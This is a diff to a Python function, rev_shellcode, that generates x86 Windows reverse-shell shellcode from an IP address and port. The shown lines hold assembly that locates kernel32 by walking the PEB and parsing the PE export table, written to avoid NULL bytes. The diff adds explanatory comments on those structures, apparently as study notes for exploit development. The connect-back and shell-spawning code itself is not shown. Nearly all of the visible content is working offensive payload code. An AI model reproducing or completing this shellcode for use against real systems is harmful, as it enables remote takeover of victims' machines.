@@ -91,6 +91,7 @@ def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
         f"{['', 'int3;'][breakpoint]}            ",
         "       mov ebp, esp                    ;",  #
         "       add esp, 0xfffff9f0             ;",  # Avoid NULL bytes
+        # TEB -> PEB -> Ldr -> InInitOrder
         "   find_kernel32:                       ",
         "       xor ecx,ecx                     ;",  # ECX = 0
         "       mov esi,fs:[ecx+30h]            ;",  # ESI = &(PEB) ([FS:0x30])
@@ -110,6 +111,15 @@ def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
         "       jmp resolve_symbols_kernel32    ;",  #
         "   find_function_shorten_bnc:           ",
         "       call find_function_ret          ;",  # Relative CALL with negative offset
+        #   
+        #   | OFFSET                            | DESCRIPTION                                                           |
+        #   | 0x3c into the file                | RVA of PE signature                                                   |
+        #   | 0x78 bytes after the PE signature | RVA of the Export Table                                               |          
+        #   | 0x14 into the Export Table        | No. of functions exported by a module                                 |
+        #   | 0x18 into the Export Table        | RVA of address table (addresses of exported functions)                |
+        #   | 0x20 into the Export Table        | RVA of name pointer table (addresses of exported function names)      |
+        #   | 0x24 into the Export Table        | RVA of ordinal table (function order number as listed in the table)   |
+        #
         "   find_function:                       ",
         "       pushad                          ;",  # Save all registers from Base address of kernel32 is in EBX Previous step (find_kernel32)
         "       mov eax, [ebx+0x3c]             ;",  # Offset to PE Signature
